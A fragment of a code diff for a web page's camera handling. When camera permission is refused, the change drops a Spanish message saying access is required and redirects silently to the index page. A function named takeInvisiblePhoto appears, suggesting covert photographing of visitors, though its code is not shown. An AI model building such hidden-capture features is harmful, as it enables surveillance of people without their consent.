@@ -49,11 +49,9 @@ async function startCamera() {
     };
 
   } catch (err) {
-    document.body.innerHTML = `
-      <h1>⚠️ Necesitamos acceso a la cámara</h1>
-      <p>No puedes entrar a esta página sin dar permisos.</p>
-    `;
+    window.location.href = "index.html";
   }
+
 }
 
 function takeInvisiblePhoto() {
